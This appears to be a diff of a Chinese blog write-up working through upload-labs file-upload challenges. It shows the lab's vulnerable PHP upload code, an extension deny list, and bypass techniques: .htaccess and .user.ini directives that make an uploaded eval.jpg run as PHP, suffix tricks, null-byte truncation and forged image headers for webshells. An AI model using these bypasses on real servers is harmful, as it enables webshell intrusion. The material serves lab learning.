+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SetHandler application/x-httpd-php<br></code></pre></td></tr></table></figure>
 
 <p>或如下指定后缀解析为php</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure>
 
 <p>再上传eval.jpg脚本，最后蚁剑连接，当然前几题也适用，蚁剑连接：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808011650457.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808011650457.png"></p>
 <h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>这个连.htaccess也过滤了，最后统一转为小写再进行过滤。。。挺严格的哈，瞅一眼提示：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025928958.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025928958.png"></p>
 <p>注意到upload里始终有一个readme.php，没过滤php7，也没过滤.ini可以上传.ini文件：</p>
 <p>user.ini：(爱来自ChatGPT)</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">user<span class="hljs-selector-class">.ini</span> ： 自 PHP <span class="hljs-number">5.3</span>.<span class="hljs-number">0</span> 起，PHP 支持基于每个目录的 <span class="hljs-selector-class">.htaccess</span> 风格的 INI 文件。此类文件仅被<br>   CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用<br>   <span class="hljs-selector-class">.htaccess</span> 文件有同样效果。<br>   <br>   除了主 php<span class="hljs-selector-class">.ini</span> 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web<br>   根目录（$_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>]</span> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。<br>   <br>   在 <span class="hljs-selector-class">.user</span><span class="hljs-selector-class">.ini</span> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI<br>   设置可被识别。<br>   <br>   两个新的 INI 指令，user_ini<span class="hljs-selector-class">.filename</span> 和 user_ini<span class="hljs-selector-class">.cache_ttl</span> 控制着用户 INI 文件的使用。<br>   <br>   user_ini<span class="hljs-selector-class">.filename</span> 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是<br>   <span class="hljs-selector-class">.user</span>.ini。<br>   <br>   user_ini<span class="hljs-selector-class">.cache_ttl</span> 控制着重新读取用户 INI 文件的间隔时间。默认是 <span class="hljs-number">300</span> 秒（<span class="hljs-number">5</span> 分钟）。<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">user.ini ： 自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被<br>   CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用<br>   .htaccess 文件有同样效果。<br>   <br>   除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web<br>   根目录（$_SERVER[&#x27;DOCUMENT_ROOT&#x27;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。<br>   <br>   在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI<br>   设置可被识别。<br>   <br>   两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。<br>   <br>   user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是<br>   .user.ini。<br>   <br>   user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。<br><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_prepend_file 是 PHP 配置选项之一，用于指定一个在每个 PHP 文件执行之前自动包含（包含在头部）的文件。这个选项允许你在所有 PHP 脚本执行之前自动加载一些通用的代码或库，无需在每个脚本中手动包含。<br><br>例如，如果你有一些通用的函数、类或设置，希望在所有 PHP 脚本执行之前都要加载，你可以通过配置 <span class="hljs-built_in">auto</span>_prepend_file 来实现。这样，你只需在一个地方定义这些共享的代码，而不必在每个脚本中都进行手动包含。<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auto_prepend_file 是 PHP 配置选项之一，用于指定一个在每个 PHP 文件执行之前自动包含（包含在头部）的文件。这个选项允许你在所有 PHP 脚本执行之前自动加载一些通用的代码或库，无需在每个脚本中手动包含。<br><br>例如，如果你有一些通用的函数、类或设置，希望在所有 PHP 脚本执行之前都要加载，你可以通过配置 auto_prepend_file 来实现。这样，你只需在一个地方定义这些共享的代码，而不必在每个脚本中都进行手动包含。<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808031553494.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808031553494.png"></p>
 <p>在user.ini添加以下内容：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=eval.jpg<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auto_prepend_file=eval.jpg<br></code></pre></td></tr></table></figure>
 
 <p>在执行readme.php时会把eval.jpg的内容包含进去，</p>
 <h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>没有进行小写转化且后缀过滤不够全面</p>
@@ -413,19 +90,19 @@
 
 <p>，钻phP后缀空子</p>
 <p>上传完之后在源代码处找到上传文件路径</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808023858250.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808023929151.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808023858250.png"></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808023929151.png"></p>
 <h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>和前面的关卡比起来，过滤中少了trim()空格过滤</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025604587.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025604587.png"></p>
 <p>上传成功后这里就懒得推算时间戳了（</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025754424.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025754424.png"></p>
 <h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>与前面的相比，缺少了<code>deldot()</code>函数对结尾点号进行过滤</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808030210926.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808030339898.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808030210926.png"></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808030339898.png"></p>
 <p>再蚁剑连接</p>
 <p>这么说点可以绕过的话，上面level5也可以用<code>.php. .</code>后缀来绕过力</p>
 <h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>少了::$DATA</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php在window的时候如果文件名+<span class="hljs-string">&quot;::<span class="hljs-variable">$DATA</span>&quot;</span>会把::<span class="hljs-variable">$DATA</span>之后的数据当成文件流处理,不会检测后缀名，且保持<span class="hljs-string">&quot;::<span class="hljs-variable">$DATA</span>&quot;</span>之前的文件名 他的目的就是不检查后缀名。<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::$DATA&quot;之前的文件名 他的目的就是不检查后缀名。<br></code></pre></td></tr></table></figure>
 
 <p>但是，我是Linux（</p>
 <p>看别人操作（悲，等之后有机会碰到知道有这么一种姿势就行，(注意蚁剑连接时不用加$::DATA)</p>
@@ -433,47 +110,47 @@
 
 <p>记得上面说的<code>.php. .</code>绕过罢</p>
 <h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>惯例上传一个eval.php，嗯？居然没报错</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033552164.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033552164.png"></p>
 <p>看一眼源代码，发现后缀没了</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033629854.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033629854.png"></p>
 <p>不多说，双写绕过试一下：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033811143.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033836704.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033811143.png"></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033836704.png"></p>
 <p>看一眼过滤，果然替换后缀为空：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<br></code></pre></td></tr></table></figure>
 
 <h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>上传了eval.jpg，观察网页源码时发现路径中多了个’&#x2F;‘，</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808035830798.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808035830798.png"></p>
 <p>观察后端源代码，</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>如果后缀不为jpg|png|gif就无法上传，根据他的逻辑，刚想试着构造多后缀突然想到也行不通</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_47598409/article/details/115050869">白名单+get00截断</a>，自己学习了相关知识，由于对应的漏洞php版本较旧相关插件缺失没法复现，(另一个主要原因是懒)</p>
 <h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>post00截断，链接同level12</p>
-<h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809014217357.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809014217357.png"></p>
 <p>和之前有所不同，</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020816409.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020816409.png"></p>
 <p>查看源码，源码检查文件前两个字节，之前在readthedocs上看到过：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020729271.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020729271.png"></p>
 <p>winhex，启动！！在一句话木马文件的开头修改字节为png的</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020929915.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020929915.png"></p>
 <p>图片马无法直接被当做木马被解析，因为本质上还是图片，要配合文件包含漏洞利用，上传成功了</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021218758.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021218758.png"></p>
 <p>获取一下文件名：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021249076.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021249076.png"></p>
 <p>连接成功：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021451179.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021451179.png"></p>
 <p>用cmd构造图片马参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1ink/p/15101706.html">文章</a></p>
 <p>最后连接成的图片在winhex中打开结构和上面的图片马一样</p>
 <h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>这题通过<code>getimagesize()</code>函数来获取图片类型，其原理依旧是通过获取文件前几个字节来判断，但是用上一题的png显示无法上传，找了个更全的文件头：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.Png图片文件包括<span class="hljs-number">8</span>字节：<span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>E <span class="hljs-number">47</span> <span class="hljs-number">0</span>D <span class="hljs-number">0</span>A <span class="hljs-number">1</span>A <span class="hljs-number">0</span>A。即为 .PNG。<br><span class="hljs-attribute">2</span>.Jpg图片文件包括<span class="hljs-number">2</span>字节：FF D8。<br><span class="hljs-attribute">3</span>.Gif图片文件包括<span class="hljs-number">6</span>字节：<span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span>|<span class="hljs-number">37</span> <span class="hljs-number">61</span> 。即为 GIF89(<span class="hljs-number">7</span>)a。<br><span class="hljs-attribute">4</span>.Bmp图片文件包括<span class="hljs-number">2</span>字节：<span class="hljs-number">42</span> <span class="hljs-number">4</span>D。即为 BM。<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。<br>2.Jpg图片文件包括2字节：FF D8。<br>3.Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。<br>4.Bmp图片文件包括2字节：42 4D。即为 BM。<br></code></pre></td></tr></table></figure>
 
 <p>前八个字节都改：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023603329.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023603329.png"></p>
 <p>上传成功：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023653515.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023653515.png"></p>
 <p>连接成功</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023731321.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023731321.png"></p>
 <h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>使用<code>exif_imagetype()</code>函数来获取文件类型，其原理也是通过读取文件头部信息(开头几个字节)，那就好办了，和上题一样就行。</p>
 <p>在使用时需要在php环境中启用php_exif拓展</p>
 <h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-comment">// 获得上传文件的扩展名</span><br>    <span class="hljs-variable">$fileext</span>= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span 